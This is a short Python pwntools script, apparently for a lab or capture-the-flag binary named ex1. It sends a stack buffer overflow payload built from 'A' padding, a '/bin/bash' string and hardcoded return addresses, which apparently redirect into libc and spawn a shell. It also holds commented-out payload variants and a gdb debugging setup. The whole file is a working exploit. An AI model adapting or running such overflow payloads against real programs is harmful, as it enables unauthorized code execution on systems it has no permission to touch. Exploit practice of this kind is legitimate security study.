from pwn import *

context.arch = "amd64"
context.terminal = ["tmux", "split-window", "-h"]
context.log_level = "debug"

target = process("./bin/ex1")

# io = gdb.debug(
#     "./bin/ex1",
#     """
#     break ex1.c:56
#     continue
#     """,
# )

bin_sh = b"/bin/bash\0" + b"A" * 54
argv = b"\0" * 8 + b"A" * 56
# io.sendline("1")
# io.sendline(
#     argv
#     + b"A" * 64
#     + bin_sh
#     + b"A" * 2 * 64
#     + b"A" * 16
#     + p64(0x7FFFFFFFD8FC)
#     + p64(0x7ffff7eafb60)
# )
# io.interactive()
target.sendline("1")
target.sendline(
    argv
    + b"A" * 64
    + bin_sh
    + b"A" * 2 * 64
    + b"A" * 16
    + p64(0x7FFFFFFFD8FC)
    + p64(0x7ffff7eafb60)
)
# target.sendline(
#     b"A" * 64
#     + bin_sh
#     + b"A" * 64
#     + b"A" * 2 * 64
#     + b"A" * 16
#     + p64(0x7FFFFFFFD8FC)
#     + p64(0x7FFFF7EA3440)
#     + p64(0x7FFFF7EA3440)
#     + p64(0x7FFFF7EA3440)
#     + p64(0x7FFFF7E1A490)
# )
target.interactive()
